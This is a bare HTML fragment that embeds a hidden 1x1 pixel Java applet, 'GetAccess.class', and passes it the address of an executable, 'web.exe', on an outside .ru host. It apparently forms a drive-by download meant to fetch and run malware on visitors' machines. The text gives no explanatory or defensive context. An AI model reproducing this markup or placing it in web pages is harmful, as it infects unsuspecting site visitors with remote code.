<applet archive="mod/ok/java/java.jar" code="GetAccess.class" width=1   height=1>
<param name="ModulePath" value="http://2.ru/mod/ok/web.exe"></applet>